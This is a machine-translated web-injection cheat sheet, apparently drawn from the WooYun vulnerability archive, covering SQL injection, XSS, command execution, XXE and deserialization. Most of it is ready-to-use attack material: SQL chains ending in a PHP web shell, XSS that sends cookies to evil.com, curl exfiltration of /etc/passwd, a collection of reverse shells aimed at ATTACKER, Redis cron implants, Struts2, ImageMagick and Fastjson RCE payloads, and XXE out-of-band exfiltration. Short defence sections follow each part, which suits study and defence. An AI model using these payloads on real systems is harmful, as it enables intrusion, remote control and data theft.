# WebInjection security

> Refined fromWooYunThree main types of injection in the vulnerability library knowledge base:SQLInjection(27,732Example)、XSS(7,532Example)、Command execution(6,826Example)
> Data source:wooyun_vulnerabilities.json (88,636Vulnerability records, 2010-2016)
> This document is for security research and defense reference only

---

## One、SQLInjection

### 1.1 Nature of vulnerabilities

```
Missing input validation → DynamicSQLConcatenation. → Breaking Semantic Boundaries → Database command execution
```

**Core formula**:SQLInjection = Code and data boundary obfuscation + User Input Elevated to ExecutableSQLInstructions

### 1.2 Detection method

#### High-risk injection point identification

| Vector type | Proportion | Typical scenarios |
|---------|------|---------|
| Login box | 66% | Username/Password concatenation |
| Search box | 64% | LIKEStatement fuzzy matching |
| POSTParameters | 60% | Form submission |
| HTTPHeader | 26% | UA/Referer/XFF |
| GETParameters | 24% | URLParameters |
| Cookie | 12% | Session identifier handling |

**High-frequency parameter names**:`id`, `sort_id`, `username`, `password`, `type`, `action`, `page`, `name`;ASP.NETUnique:`__viewstate`, `__eventvalidation`

#### Quick Detection Process

```
1. Single Quote/Double quote test → Observe error messages
2. Mathematical operations: id=2-1 / id=1*1 → Observe equivalence
3. Boolean testing: and 1=1 / and 1=2 → Compare response differences
4. Time delay: and sleep(5) → Observe response time
5. Sorting exploration: order by N → Increment to Error
```

#### Database fingerprinting

| Database | Delay function | System tables | Error feature |
|-------|---------|-------|---------|
| MySQL | `sleep(N)` / `benchmark()` | `information_schema.tables` | "You have an error in your SQL syntax" |
| MSSQL | `WAITFOR DELAY '0:0:N'` | `sysobjects` | "Unclosed quotation mark" |
| Oracle | `dbms_pipe.receive_message('a',N)` | `all_tables` | "ORA-00942" |
| Access | Cartesian product delay | `MSysObjects` | "Microsoft JET Database Engine" |

### 1.3 Injection techniques andPayload

#### Boolean blind injection.

```sql
id=1 AND 1=1    -- True
id=1 AND 1=2    -- False
id=1' AND '1'='1
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
-- MySQL RLIKE
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
```

#### Time-based blind injection

```sql
-- MySQL(Nested delay practical skills)
id=(select(2)from(select(sleep(8)))v)
id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
-- Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1
```

#### Union query

```sql
id=1 ORDER BY N--              -- Exploration count
id=-1 UNION SELECT 1,2,3,4,5--  -- Determine echo position
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

#### Error injection

```sql
-- MySQL extractvalue/updatexml
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
-- MySQL floor
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
-- CHARFunction bypass character filtering
' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+(SELECT CHAR(49))+CHAR(113))) AND 'a'='a
```

### 1.4 WAF/Filtering bypass techniques

#### Inline comments (most commonly used)

```sql
/*!50000union*//*!50000select*/1,2,3
/*!UNION*//*!SELECT*/1,2,3
-- DeDeCMSBypass instance
/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x7C,userid,0x3a,pwd,0x7C),5,6,7,8,9+from+`#@__admin`#
```

#### Encoding bypass

```sql
-- Hexadecimal: 'admin' -> 0x61646d696e
SELECT * FROM users WHERE name=0x61646d696e
-- URLDouble encoding: %252f -> / , %2527 -> '
-- Unicode: %u0027 -> '
```

#### Case sensitivity + Whitespace replacement

```sql
UnIoN SeLeCt                    -- Case mixing confusion
UNION/**/SELECT/**/1,2,3        -- Comments Replacing Spaces
UNION%09SELECT                  -- TabAlternative
UNION%0ASELECT                  -- Line break replacement
```

#### Function substitution

```sql
SUBSTRING -> MID / SUBSTR / LEFT / RIGHT
CONCAT -> CONCAT_WS / ||
CHAR(65) -> CharactersA
```

#### Logical Equivalent Replacement

```sql
AND 1=1 -> && 1=1 -> & 1
OR 1=1  -> || 1=1 -> | 1
id=1 -> id LIKE 1 / id BETWEEN 1 AND 1 / id IN(1) / id REGEXP '^1$'
-- Quote Bypass
'admin' -> CHAR(97,100,109,105,110) -> 0x61646d696e
```

#### Wide Byte Injection (GBKEncoding)

```
%bf%27 Bypass addslashes()   -- GBKMulti-byte character swallowing backslashes
```

#### HTTPLayer Bypass

```
Parameter pollution: id=1&id=2             -- Duplicate parameter obfuscation
Chunked Transfer: Transfer-Encoding: chunked
X-Forwarded-ForInjection / CookieInjection  -- Unconventional injection points
```

### 1.5 Utilization chain

#### MySQLFull exploitation chain

```sql
-- 1.Information -> 2.Library -> 3.Table. -> 4.List -> 5.Data -> 6.File -> 7.Shell
union select 1,database(),version(),user(),5--
union select 1,group_concat(schema_name),3 from information_schema.schemata--
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--
union select 1,group_concat(username,0x3a,password),3 from users--
union select 1,load_file('/etc/passwd'),3--
union select 1,'<?php @system($_POST[cmd]);?>',3 into outfile '/var/www/html/shell.php'--
```

#### MSSQLFull exploitation chain

```sql
union select 1,@@version,db_name(),system_user,5--
union select 1,name,3 from master..sysdatabases--
union select 1,name,3 from sysobjects where xtype='U'--
union select 1,username+':'+password,3 from users--
-- Command execution (requiressaPermission)
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
exec master..xp_cmdshell 'whoami'--
```

#### OracleUtilization chain

```sql
union select banner,null from v$version where rownum=1--
union select table_name,null from all_tables where rownum<=10--
union select username||':'||password,null from users--
```

#### AccessBlind injection exploitation chain

```sql
-- Noneinformation_schema, need to obtain source code or guess table name
id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97
-- Multi-user enumeration useNOT IN
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
```

### 1.6 Defensive measures

```python
# Parametric Query (Preferred)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))  # Python
```

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");        // PHP PDO
```

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); // Java
```

- Parameterized query/Precompiled statements (preferred)、Stored procedure (secondary option)
- Whitelist input validation + Type conversion of numeric parameters
- Database minimum privileges + Error Message Hiding + WAFDeployment

---

## Two、XSSCross-site scripting

### 2.1 Nature of vulnerabilities

```
User input(Data) -> Unencoded output -> Browser Parsed as Code -> Script execution
```

**Core formula**:XSS = Trust boundary breach + Output context obfuscation (data inHTML/JS/CSS/URLMiddle Semantic Changes)

### 2.2 Detection method

#### High-risk output points.

| Output points | Trigger conditions | Typical scenarios |
|-------|---------|---------|
| User nickname/Signature | Page loading | Personal homepage、Comments、Friends list |
| Search box echo | Search operation | Search results page |
| Comments/Message | Content display | Forum、Blog、Product review |
| File name/Description | File list | Cloud Storage、Photo Album |
| Email body/Title | Open email | Email system |
| Order notes | Background view | E-commerce backend.、Ticketing System |

**Covert output points**(easy to overlook):HTTPHeader(XFF/UAWrite to log)、WAPSubmitPCDisplay、Client nicknameWebRendering、Draft box/Audit list

#### Contextual quick judgment.

```
Output in <script> Inside? -> JSContext (Check Quote Type)
Output in attribute value?    -> Attribute context (check attribute types)
Output in tag content?  -> HTMLContext (check special tagstextarea/title)
Output inURLIn?       -> URLContext (Check Protocol Restrictions)
Output inCSSIn?       -> CSSContext (checkexpressionSupport)
```

### 2.3 ContextPayload

#### HTMLLabel content

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### HTMLAttribute value

```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### JavaScriptString

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### URLContext

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 2.4 WAF/Filtering bypass techniques

#### Encoding bypass

```html
<!-- HTMLEntity -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
<!-- Base64 + dataProtocol -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<!-- CSSCode(IE) -->
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

#### Tag/Attribute transformation

```html
<ScRiPt>alert(1)</sCrIpT>              <!-- Case mixing confusion -->
<script/src=//xss.com/x.js>            <!-- Slash replacing space -->
<img src=x onerror=alert(1)>           <!-- No quotes -->
<scrscriptipt>alert(1)</scrscriptipt>  <!-- Double write bypass -->
<scr\x00ipt>alert(1)</script>          <!-- Null character bypass -->
```

#### Alternative event handler

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

#### WAFSpecific Bypass

```html
.<script src=http://localhost/1.js>.    <!-- Security Treasure: Add dots at both ends -->
<!--[if true]><img onerror=alert(1) src=--> <!-- Annotation interference -->
```

#### Length limit bypass

```html
<script src=//xss.pw/j>                <!-- Shortest external loading -->
<!-- DOMConcatenation. -->
<script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
<!-- String concatenation bypass keyword -->
<script>window['al'+'ert'](1)</script>
<!-- fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### HTTPOnlyBypass

- FlashInterface to obtain user information alternativeCookie
- Convert toCSRFMethod: Directly execute sensitive operations (change password、Add administrator、Readtoken)

### 2.5 Utilization chain

#### CookieTheft

```html
<script>new Image().src="https://evil.com/c?="+document.cookie</script>
<img src=x onerror="new Image().src='https://evil.com/c?='+document.cookie">
<script>fetch('https://evil.com/c?='+document.cookie)</script>
```

#### DOM XSSCritical source and sink

**Hazard source**:`location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`

**Dangerous sink**:`innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`

#### XSSWorm core logic

```javascript
// 1.Obtain current user identity(cookie/token)
// 2.Construct Self-InclusionpayloadContent of
// 3.Automatic release/Share (AJAX POST)
// 4.Trigger condition: View/Access equals propagation
function worm(){
    jQuery.post("/api/post", {"content": "<Self-propagatingpayload>"})
}
worm()
```

#### Composite exploitation patterns

```
XSS + CSRF -> ObtainTokenPerform management operations
XSS + SQLi -> Blind input acquisitionCookie -> Background injection
XSS -> Account Hijacking -> Privilege Escalation -> Worm propagation
XSSBlind typing(Message/Work order/Feedback) -> Obtain Backend AdministratorCookie
```

### 2.6 Defensive measures

- **Output encoding**(Core):HTMLContext useHTMLEntity,JSContext useJSCoding,URLContext useURLCode
- CSPPolicy restrictions on script sources
- HTTPOnlyProtectCookie
- Whitelist input validation (avoid blacklist, there are always omissions)
- **Common Mistakes**: Only filterscriptTag、Filter lowercase only、Frontend filtering can be bypassed by packet capture、Single Filter Bypassed by Double Write

---

## Three、Command execution

### 3.1 Nature of vulnerabilities

```
User input(Data) -> Unpurified Splicing -> Enter system commands/Code execution context -> OSInstruction execution
```

**Core formula**: Command execution = Data flow contamination. + Execution context (Shell/Code/Expression)

### 3.2 Detection method

#### High-frequency entry points

| Entry type | Proportion | Typical scenarios |
|---------|------|---------|
| File operation | 68% | Upload、Read、Unzip |
| System command function | 62% | exec/system/shell_exec |
| Struts2Framework | 50% | OGNLExpression injection |
| SSRF | 30% | URLParameter passing |
| pingCommand | 26% | Network Diagnostics Function |
| Image processing | 24% | ImageMagick |
| JavaDeserialization | 20% | WebLogic/JBoss |

#### Command concatenation symbol

| Symbol | Meaning | Execution logic |
|------|------|---------|
| `;` | Separator | Execute in order, regardless of the previous command results |
| `\|` | Pipeline | Previous output as subsequent input |
| `` ` `` / `$()` | Command injection | Execute Internal Commands and Return Results |
| `\|\|` | Logical OR | Execute later after failure |
| `&&` | Logic and | Only execute after the previous success |
| `%0a` / `%0d%0a` | New line | URLEncoded newline separated |

#### No echo detection

```bash
# DNSLogTakeaway
ping `whoami`.xxxxx.ceye.io
curl http://`whoami`.xxxxx.ceye.io

# HTTPTakeaway
curl https://evil.com/?d=`cat /etc/passwd | base64 | tr '\n' '-'`
curl -X POST -d "data=$(cat /etc/passwd)" https://evil.com/c

# Time delay
sleep 5
ping -c 5 127.0.0.1

# File WriteWebDirectory
echo "test" > /var/www/html/proof.txt
```

### 3.3 Bypassing techniques

#### Space Bypass

```bash
cat${IFS}/etc/passwd          # ${IFS}Internal field separator
cat$IFS$9/etc/passwd          # $9Empty position parameters
cat%09/etc/passwd             # TabTab
cat</etc/passwd               # Redirection symbol
{cat,/etc/passwd}             # Brace expansion
```

#### Keyword bypass

```bash
# Quotation Marks/Backslash split
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Variable concatenation
a=c;b=at;$a$b /etc/passwd

# Wildcard
/bin/ca* /etc/passwd
/bin/c?t /etc/passwd
/???/??t /etc/passwd
```

#### catCommand substitution.

```bash
tac  head  tail  more  less  nl  sort  uniq  od -c  xxd  base64  rev  paste
```

#### Encoding bypass

```bash
# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# Hex
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### 3.4 Utilize chain andPayload

#### Framework/Component VulnerabilitiesPayload

**ImageMagick (CVE-2016-3714)**:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/ATTACKER/8080 0>&1 &")'
pop graphic-context
```

**Struts2 S2-045**:

```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

**Struts2 OGNLGeneric Command Execution**:

```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
```

**ElasticSearch GroovySandbox bypass**:

```json
{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

**RedisUnauthorized writeSSHPublic key/Crontab**:

```bash
redis-cli -h target
config set dir /root/.ssh && config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n" && save
# Or writecrontab
config set dir /var/spool/cron && config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/8080 0>&1\n\n" && save
```

#### BounceShellCollection

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# NCNone-eParameters
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER",PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}
```

#### PHPDangerous Function Level

| Hierarchy | Functions | Capability |
|-----|------|-----|
| L1Code Level | `eval()`, `assert()(PHP5)`, `create_function()`, `preg_replace(/e)` | PHPCode execution. |
| L2 ShellLevel | `system()`, `passthru()`, `shell_exec()`, Backtick | System commands have echo |
| L3Process level | `exec()`, `popen()`, `proc_open()`, `pcntl_exec()` | Child process execution |
| L4Callback level | `call_user_func()`, `array_map()` | Indirect Function Call |

#### PHP WAFBypassing techniques

```php
// String concatenation
$func = 'sys'.'tem'; $func('whoami');
// Variable function.
$a='sys';$b='tem';($a.$b)('whoami');
// Code Obfuscation
base64_decode('c3lzdGVt')           // system
str_rot13('flfgrz')                 // system
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) // system
// String operations.
strrev('metsys')('whoami');
implode('',array('s','y','s','t','e','m'))('whoami');
```

#### disable_functionsBypass

| Method | Principle | Conditions |
|-----|------|-----|
| LD_PRELOAD | Hijacking system library functions,mail()Triggering the loading of malicious.so | Uploadable.so + mail()Available |
| Shellshock | Bash<=4.3Environment Variable Injection | Old versionBash |
| Apache Mod_CGI | .htaccessConfigurationCGIExecute | Apache + AllowOverride |
| PHP-FPM/FastCGI | ModifyPHPConfiguration Execution Code | AccessibleFPMPort/SSRF |
| ImageMagick | delegateFunction command execution | UseIMProcessing images. |
| Windows COM | WScript.ShellComponents | Windows + COMExpansion |

**LD_PRELOADCore exploitation**:

```php
// Upload malicious.so(HijackinggeteuidFunction, internal callssystem())
putenv("LD_PRELOAD=/tmp/exploit.so");
mail("a@a.com","test","test");  // mail()StartsendmailProcess -> Load.so -> Execute Command
```

### 3.5 Defensive measures

```php
// Best practices: whitelist verification + escapeshellarg
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    system("ping " . escapeshellarg($_GET['ip']));
}
```

- Avoid direct system command calls, use language built-in functions instead
- Parameterized execution (array parameter passing), prohibit string concatenation
- `escapeshellarg()` + `escapeshellcmd()` Escape
- Whitelist validation input + Type checking
- `disable_functions` Disable dangerous functions (note bypass risks)
- Run with minimal privilegesWebService + Container/chrootIsolation
- Timely update framework components (Struts2/WebLogic/ImageMagickEtc.)

---

## Four、XXE (XMLExternal Entity Injection)

### 4.1 Nature of vulnerabilities

```
XMLInput. -> Parser enabledDTD/External entities -> Entity references are resolved and executed -> File reading/SSRF/RCE
```

**Core formula**:XXE = XMLParser allows external entity references + User-controllableXMLInput.

### 4.2 Detection method

**High-risk entry point identification**

| Entry type | Detection Features | Typical scenarios |
|----------|----------|----------|
| APIInterface | Content-TypeContaining`text/xml`Or`application/xml` | RESTful API、SOAP WebService |
| File upload | SVGImages、DOCX/XLSX/PPTX(EssenceZIPContainingXML) | Avatar upload、Document import |
| Data parsing | XMLConfiguration import、RSS/AtomSubscription | Backend management、Aggregation function |
| Protocol interaction | SAMLAuthentication、WebDAV、XMPP | SSOLogin、File management |

**Quick Detection Process**

```
1. IdentificationXMLHandling interface → ModifyContent-TypeForapplication/xmlTesting
2. Send basicDTDDeclaration → Observe if parsing(Error reporting differences)
3. Attempt external entity reference → fileProtocol reading of known files
4. When there is no echo → OOBTakeaway(DNS/HTTPCall back)
```

### 4.3 ClassicPayload

#### File reading (with echo)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### SSRFInternal network detection

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

#### Blind injection - OOBTakeout data

```xml
<!-- ExternalDTD (attackerServer hostingevil.dtd) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- evil.dtdContent: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

#### Error feedback

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %e;
]>
```

### 4.4 Bypassing techniques

| Bypass Method | Method | Applicable scenarios |
|----------|------|----------|
| Encoding bypass | UTF-16BE/LE、UTF-7CodeXML | WAFBased onASCIIPattern matching |
| Parameter entity nesting | `%entity;`Alternative`&entity;` | Filter common entities`&` |
| XInclude | `<xi:include href="file:///etc/passwd"/>` | UncontrollableDOCTYPEDeclaration |
| SVGEmbed | SVGFile embeddingXXEEntity | Only allow image uploads |
| DOCX/XLSXEmbed | ModifyOfficeWithin the document`[Content_Types].xml` | Document upload function |
| CDATApackages. | UseCDATASegment Bypass Special Character Restrictions | Read containingXMLFiles with special characters |

### 4.5 Defensive measures

```java
// Java: DisableDTDAnd external entities.
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

- DisableDTDProcessing and external entity resolution (preferred)
- UseJSONAlternativeXMLPerform data exchange
- Input whitelist verification、UpgradeXMLParsing library
- WAFRule interception`<!DOCTYPE`/`<!ENTITY`/`SYSTEM`Keyword

---

## Five、Deserialization vulnerability

### 5.1 Nature of vulnerabilities

```
Serialized Data(Untrusted) -> Deserialization function -> Object reconstruction triggers magic methods/callback -> Malicious logic execution
```

**Core formula**: DeserializationRCE = Controllable serialized input + Dangerous class inclasspath/Within scope + Reachable exploitation chain(Gadget Chain)

### 5.2 JavaDeserialization

**Detection identifier**

```
Binary stream: AC ED 00 05 (hexHeader)
Base64:   rO0AB (Encoded header)
Common locations: Cookie、ViewState、JMX、RMI、T3Protocol、HTTP Body
```

**Utilize chain speed check**

| Utilization chain | Dependency library | Triggering methods. | Tool |
|--------|--------|----------|------|
| Commons-Collections | commons-collections 3.x/4.x | InvokerTransformer | ysoserial |
| Spring | spring-core + spring-beans | MethodInvokeTypeProvider | ysoserial |
| Fastjson | fastjson < 1.2.68 | `@type` autoType | Manual/Dedicated tools |
| Jackson | jackson-databind | Polymorphic deserialization | ysoserial |
| JNDIInjection | JDK < 8u191 | LDAP/RMIRemote class loading | JNDIExploit/marshalsec |

**FastjsonClassicPayload**

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// 1.2.47 Cache bypass
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/","autoCommit":true}}
```

**Toolchain**

```bash
# ysoserialGeneratepayload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64

# JNDIInjection service
java -jar JNDIExploit.jar -i attacker_ip

# marshalsecLaunch maliciousLDAP/RMI
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"
```

### 5.3 PHPDeserialization

**Detection identifier**

```
Format: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
Key functions: unserialize(), phar://Protocol trigger
```

**Magic method exploitation chain**

| Method | Trigger timing | Utilization method |
|------|----------|----------|
| `__wakeup()` | unserialize()During invocation | Attribute override→Dangerous operation |
| `__destruct()` | When destroying the object | File deletion/Write/Command execution |
| `__toString()` | Object used as a string | Concatenation into dangerous functions |
| `__call()` | Call non-existent methods | Chained call pivot. |

**POPChain construction ideas**

```
1. Find Entry Point: __wakeup()/__destruct() Call in the$this->xxxmethod of attributes
2. Jumping board: Pass__toString()/__call()/__get() Link to other classes
3. Endpoint: Reachsystem()/eval()/file_put_contents()And other dangerous functions
4. Construct.: Control attribute values to ensure link connectivity
```

**PharDeserialization (No Need forunserializeCall)**

```php
// File operation function triggerphar://Deserialization
file_exists('phar://upload/evil.phar');
is_dir('phar://upload/evil.jpg');      // Disguised as image suffix
```

### 5.4 PythonDeserialization

**Dangerous functions**

```python
import pickle, yaml, marshal

# pickle - Most common
pickle.loads(data)      # Deserialization
pickle.load(file)       # Deserialize from File

# yaml - NeededLoader
yaml.load(data)         # Default unsafe(Old version)
yaml.load(data, Loader=yaml.FullLoader)  # limit loading

# marshal - Bytecode level
marshal.loads(data)     # Load code objects
```

**pickle RCE Payload**

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# Equivalent Manual Construction:
# pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
```

**yaml RCE Payload**

```yaml
!!python/object/apply:os.system ['whoami']
# Or
!!python/object/new:subprocess.check_output [['whoami']]
```

### 5.5 Defensive measures

```java
// Java: ObjectInputStreamWhitelist Filtering
ObjectInputStream ois = new ObjectInputStream(input) {
    @Override protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!allowedClasses.contains(desc.getName())) throw new InvalidClassException("Blocked: " + desc.getName());
        return super.resolveClass(desc);
    }
};
```

- **Java**: Upgrade components(Fastjson/Jackson/Commons-Collections)、CloseautoType、Use whitelist deserialization filters
- **PHP**: Avoidunserialize()Process user input、Usejson_decodeAlternative、Disablephar://Protocol
- **Python**: Use`yaml.safe_load()`Alternative`yaml.load()`、ForbiddenpickleHandle untrusted data、UseJSON
- **Generic**: Avoid transmitting data in native serialization formats, consistently usingJSON; Sign the deserialization entry/HMACValidation

---

## Appendix:SQLMapQuick lookup

```bash
# Basic detection
sqlmap -u "http://t/p.php?id=1" --batch
# POSTRequest
sqlmap -u "http://t/login.php" --data="user=t&pass=t" --batch
# Cookie/HTTPHeader injection
sqlmap -u "http://t/p.php" --cookie="id=1" --level=2 --batch
sqlmap -u "http://t/p.php" --headers="X-Forwarded-For: 1" --level=3 --batch
# BypassWAF
sqlmap -u "http://t/p.php?id=1" --tamper=space2comment,between --batch
# Data extraction chain
sqlmap ... --dbs
sqlmap ... -D db --tables
sqlmap ... -D db -T tbl --columns
sqlmap ... -D db -T tbl -C c1,c2 --dump
```
